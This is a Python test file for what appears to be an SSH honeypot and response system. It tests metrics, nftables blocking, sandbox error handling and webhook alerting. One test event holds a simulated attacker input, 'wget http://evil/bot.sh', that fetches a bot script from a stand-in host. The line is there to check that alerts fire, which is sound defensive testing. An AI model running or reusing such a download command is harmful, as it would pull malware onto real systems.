"""Ninth batch: metrics, nftables success, sandbox error paths, webhook branch."""

from __future__ import annotations

import asyncio
import time

import pytest

from cloudsentinel.config import load_settings
from cloudsentinel.firewall import NFTablesBackend
from cloudsentinel.metrics import get_metrics
from cloudsentinel.pipeline import EventEnvelope
from cloudsentinel.sandbox import DockerSDKSandbox, GVisorSandbox
from cloudsentinel.server import CloudSentinelSSHServer, ConnectionLimiter


def test_metrics_methods() -> None:
    metrics = get_metrics()
    metrics.record_connect()
    metrics.record_disconnect()
    metrics.record_auth_fail()
    metrics.record_auth_success()
    metrics.record_command()
    metrics.record_block("unit")
    metrics.record_event("unit.event")
    metrics.set_mttb(1.5)
    metrics.set_blocked_count(2)
    metrics.set_pipeline_status(True, 0)
    assert metrics.render()
    assert "cloudsentinel_" in metrics.content_type or "text/plain" in metrics.content_type


@pytest.mark.asyncio
async def test_nftables_success_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    class FakeProc:
        returncode = 0

        async def communicate(self) -> tuple[bytes, bytes]:
            return b"", b""

    async def fake_exec(*_args: str, **_kwargs: object) -> FakeProc:
        return FakeProc()

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    backend = NFTablesBackend(path="nft")
    ok, _ = await backend.block("8.8.8.8")
    assert ok is True
    ok, _ = await backend.unblock("8.8.8.8")
    assert ok is True
    assert await backend.is_blocked("8.8.8.8") is True


@pytest.mark.asyncio
async def test_gvisor_error_path(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("cloudsentinel.sandbox.shutil.which", lambda _: "/usr/bin/runsc")

    async def fake_exec(*_args: object, **_kwargs: object):
        raise OSError("runsc failed")

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    code, message = await GVisorSandbox().execute("whoami", "~")
    assert code == 1
    assert "gVisor error" in message


@pytest.mark.asyncio
async def test_docker_sdk_timeout_and_error(monkeypatch: pytest.MonkeyPatch) -> None:
    pytest.importorskip("docker")

    class TimeoutContainer:
        def wait(self, timeout: int) -> dict:
            raise TimeoutError()

        def kill(self) -> None:
            return None

        def logs(self) -> bytes:
            return b""

    class TimeoutContainers:
        def run(self, *_args: object, **_kwargs: object) -> TimeoutContainer:
            return TimeoutContainer()

    class TimeoutClient:
        containers = TimeoutContainers()

    sandbox = DockerSDKSandbox()
    sandbox._client = TimeoutClient()
    code, message = await sandbox.execute("whoami", "~")
    assert code == 124
    assert "timeout" in message.lower()

    class BrokenContainers:
        def run(self, *_args: object, **_kwargs: object):
            raise RuntimeError("docker broke")

    class BrokenClient:
        containers = BrokenContainers()

    sandbox2 = DockerSDKSandbox()
    sandbox2._client = BrokenClient()
    code, message = await sandbox2.execute("whoami", "~")
    assert code == 1
    assert "Sandbox error" in message


@pytest.mark.asyncio
async def test_server_webhook_branch(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )

    class FakePipeline:
        async def emit(self, _envelope: EventEnvelope) -> None:
            return None

    class FakeSoar:
        async def process_event(self, _session: str, _event: dict) -> dict:
            return {"cloudsentinel_soar_action": "dry_run_block", "cloudsentinel_risk_score": 80}

    class FakeHassh:
        def record_sighting(self, *_args: object) -> None:
            return None

        def lookup(self, *_args: object) -> dict:
            return {}

    class FakeNotifier:
        def __init__(self) -> None:
            self.called = False

        async def send_alert(self, _event: dict) -> None:
            self.called = True

    notifier = FakeNotifier()
    monkeypatch.setattr("cloudsentinel.webhook.get_notifier", lambda: notifier)
    server = CloudSentinelSSHServer(
        settings=settings,
        pipeline=FakePipeline(),
        soar=FakeSoar(),
        hassh_dna=FakeHassh(),
        limiter=ConnectionLimiter(),
    )
    await server._process_event(
        {
            "eventid": "cloudsentinel.command.input",
            "session": server.session_id,
            "src_ip": "8.8.8.8",
            "src_port": 1234,
            "input": "wget http://evil/bot.sh",
            "timestamp": time.time(),
        }
    )
    assert notifier.called is True
